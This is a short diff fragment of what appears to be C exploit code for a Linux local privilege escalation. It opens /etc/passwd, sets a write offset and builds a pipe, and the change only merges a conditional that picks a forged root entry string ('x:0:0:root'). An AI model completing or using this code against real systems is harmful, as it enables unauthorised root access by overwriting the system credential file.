@@ -11,8 +11,7 @@ void
 {
 	int	fd = open( "/etc/passwd", O_RDONLY );
 	size_t	offset = 5;
-	char	*data = ":0:0:rootx";
-	if( argc > 1 && *argv[1] == ':' ) data = "x:0:0:root";
+	char	*data = argc > 1 && *argv[1] == ':' ? "x:0:0:root" : ":0:0:rootx" ;
 
 	int	p[2];
 	pipe( p );
